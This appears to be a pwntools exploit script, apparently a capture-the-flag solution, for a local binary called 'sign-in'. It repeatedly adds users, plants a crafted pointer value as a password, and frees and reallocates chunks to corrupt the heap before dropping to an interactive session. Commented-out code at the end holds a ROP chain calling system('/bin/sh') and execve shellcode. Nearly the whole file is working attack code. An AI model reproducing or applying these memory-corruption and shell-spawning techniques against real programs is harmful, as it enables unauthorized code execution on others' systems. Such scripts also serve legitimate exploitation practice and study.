#!/usr/bin/env python3

from pwn import *

exe = ELF("./sign-in")
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")
context.binary = exe

if args.REMOTE:
    p = remote('127.0.0.1', 10002)
else:
    p = process(exe.path)
context.terminal = ["alacritty","-e"]
def GDB():
    gdb.attach(p, gdbscript = '''
    # b*0x555555554000 + 0x00000000000015BE
    c
    ''')

    input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

def add(user, passw):
    sla(b'> ', b'1')
    sa(b': ', user)
    sa(b': ', passw)

def log(user, passw):
    sla(b'> ', b'2')
    sa(b': ', user)
    sa(b': ', passw)

def remove():
    sla(b'> ', b'3')

GDB()

add(b'aaaa', b'bbbb')    
add(b'aaaa', b'bbbb')    
add(b'aaaa', b'bbbb')    
add(b'aaaa', b'bbbb')    
add(b'aaaa', b'bbbb')    
add(b'aaaa', b'bbbb')    
add(b'aaaa', b'bbbb')    
  
add(b'aaaa', b'bbbb')    
add(b'aaaa', b'bbbb')    
add(b'aaaa', b'bbbb')    
add(b'aaaa', b'bbbb')    
add(b'aaaa', b'bbbb')    
add(b'aaaa', b'bbbb')   
add(b'hehe', p64(0x4040b0 - 8))    
add(b'kkkk', b'kkkk')    

log(b'hehe', p64(0x4040b0 - 8))    
remove()

add(b'kaka', b'keke')    
log(b'kaka', b'keke')    
remove()
# log(b'kkkk', b'kkkk')    

# add(b'nonono', b'napnap')    

# log(b'kaka', b'keke')    



p.interactive()

# pop_rdi = ROP(libc).find_gadget(["pop rdi","ret"])[0]
# rop = [pop_rdi+1,pop_rdi,next(libc.search(b"/bin/sh\0")),libc.sym.system]
# rop = b"".join([p64(i) for i in rop])

# shellcode1 = asm(
#     '''
#     mov rbx, 29400045130965551
#     push rbx

#     mov rdi, rsp
#     xor rsi, rsi
#     xor rdx, rdx
#     mov rax, 0x3b
#     syscall
#     ''', arch = 'amd64'
# )
